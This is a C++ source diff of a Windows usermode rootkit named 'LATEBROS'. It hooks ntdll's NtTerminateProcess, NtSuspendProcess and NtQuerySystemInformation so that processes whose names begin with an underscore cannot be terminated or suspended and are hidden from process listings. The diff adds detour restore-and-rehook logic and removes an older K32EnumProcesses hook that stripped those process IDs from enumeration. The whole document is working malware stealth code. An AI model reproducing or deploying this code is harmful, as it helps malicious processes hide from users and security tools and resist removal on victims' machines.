@@ -7,6 +7,7 @@
 *
 */
 typedef NTSTATUS(NTAPI *NtTerminateProcesss_t)(HANDLE ProcessHandle, NTSTATUS ExitCode);
+extern "C" char __declspec(dllexport) ntterm_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntterm(HANDLE process_handle, NTSTATUS exit_code)
 {
 	// SOME APPLICATIONS (TASKMGR FOR EXAMPLE) OPEN SPECIFIC HANDLES WITH JUST THE REQUIRED RIGHTS
@@ -29,8 +30,18 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntterm(HANDLE process_handle, NT
 	if (success && name_buffer[0] == L'_')
 		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED
 
-	auto function_pointer = GetProcAddress(GetModuleHandleA("ntdll"), "NtTerminateProcess");
-	return reinterpret_cast<NtTerminateProcesss_t>(function_pointer)(process_handle, exit_code);
+	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtTerminateProcess"));
+
+	// RESTORE
+	detour::remove_detour(function_pointer, ntterm_og, sizeof(ntterm_og));
+
+	// CALL
+	auto result = reinterpret_cast<NtTerminateProcesss_t>(function_pointer)(process_handle, exit_code);
+
+	// REHOOK
+	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntterm));
+
+	return result;
 }
 
 /*
@@ -39,6 +50,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntterm(HANDLE process_handle, NT
 *
 */
 typedef NTSTATUS(NTAPI *NtSuspendProcesss_t)(HANDLE ProcessHandle);
+extern "C" char __declspec(dllexport) ntsusp_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntsusp(HANDLE process_handle)
 {
 	// SOME APPLICATIONS (TASKMGR FOR EXAMPLE) OPEN SPECIFIC HANDLES WITH JUST THE REQUIRED RIGHTS
@@ -61,8 +73,18 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntsusp(HANDLE process_handle)
 	if (success && name_buffer[0] == L'_')
 		return STATUS_ACCESS_DENIED; // RETURN ACCESS DENIED
 
-	auto function_pointer = GetProcAddress(GetModuleHandleA("ntdll"), "NtSuspendProcess");
-	return reinterpret_cast<NtSuspendProcesss_t>(function_pointer)(process_handle);
+	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtSuspendProcess"));
+
+	// RESTORE
+	detour::remove_detour(function_pointer, ntsusp_og, sizeof(ntsusp_og));
+
+	// CALL
+	auto result = reinterpret_cast<NtSuspendProcesss_t>(function_pointer)(process_handle);
+
+	// REHOOK
+	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntsusp));
+
+	return result;
 }
 
 /*
@@ -119,9 +141,19 @@ typedef struct _SYSTEM_PROCESS_INFO
 	HANDLE                  ProcessId;
 	HANDLE                  InheritedFromProcessId;
 }SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;
+extern "C" char __declspec(dllexport) qsi_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS system_information_class, PVOID system_information, ULONG system_information_length, PULONG return_length)
 {
+	auto function_pointer = reinterpret_cast<uintptr_t>(NtQuerySystemInformation);
+
+	// RESTORE
+	detour::remove_detour(function_pointer, qsi_og, sizeof(qsi_og));
+
+	// CALL
 	auto result = NtQuerySystemInformation(system_information_class, system_information, system_information_length, return_length);
+
+	// REHOOK
+	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(qsi));
 
 	if (!NT_SUCCESS(result))
 		return result;
@@ -151,50 +183,4 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 	}
 
 	return result;
-}
-
-
-/*
- * Function: KERNEL32!K32EnumProcesses
- * Purpose: Disguise any LATEBROS process by removing its respective process id from the process list
- *
- */
-extern "C" BOOL __declspec(dllexport) WINAPI enump(DWORD* process_ids, DWORD cb, DWORD* bytes_returned_ptr)
-{
-	if (!K32EnumProcesses(process_ids, cb, bytes_returned_ptr))
-		return false; // NO NEED TO DO ANYTHING IF THE FUNCTION FAILS
-
-    // PARSE ORIGINAL LIST
-	auto process_list = std::unordered_set<DWORD>();
-	for (size_t process_index = 0; process_index < *bytes_returned_ptr / sizeof(DWORD)/*ENTRY SIZE*/; process_index++)
-		process_list.insert(process_ids[process_index]);
-
-	// CLEAR ORIGINAL LIST
-	ZeroMemory(process_ids, cb);
-
-	// ITERATE NEW LIST, REMOVE ANY PROTECTED ENTRIES
-	auto temp_process_list = process_list; // COPY TO PREVENT INVALIDATION, LAZY WAY
-	for (const auto& process_id : temp_process_list)
-	{
-		auto handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, false, process_id);
-
-		wchar_t name_buffer[MAX_PATH] = {};
-		if (GetModuleBaseNameW(handle, nullptr, name_buffer, MAX_PATH))
-		{
-			// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROTECTED PROCESS
-			if (name_buffer[0] == L'_')
-			{
-				process_list.erase(process_id);		  // REMOVE ITS ENTRY IN OUR LIST
-				*bytes_returned_ptr -= sizeof(DWORD); // DECREMENT TOTAL SIZE
-			}
-		}
-
-		CloseHandle(handle); // LEAKS ARE BAD
-	}
-
-	// REWRITE NEW LIST
-	auto temp_vector = std::vector<DWORD>(process_list.begin(), process_list.end());
-	memcpy(process_ids, temp_vector.data(), temp_vector.size() * sizeof(DWORD));
-
-	return true;
 }
